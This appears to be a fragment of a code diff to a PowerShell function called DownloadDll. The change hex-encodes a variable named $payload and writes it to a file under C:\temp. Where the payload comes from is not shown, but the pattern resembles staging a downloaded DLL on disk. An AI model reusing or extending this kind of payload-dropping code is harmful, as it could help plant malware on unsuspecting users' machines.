@@ -6,9 +6,9 @@ function DownloadDll {
     if (!(Test-Path -Path "C:\temp\")) {
         New-Item -ItemType Directory -Path "C:\temp\"
     }
-    
-    # Write data to the file
-    $payload | Out-File -FilePath $outFile
+   
+	# Convert payload to hexadecimal and write to the file
+    $payload.ToCharArray() | ForEach-Object { '{0:X}' -f [int]$_ } | Out-File -FilePath $outFile
 
     Write-output "DLL Download done...."
 
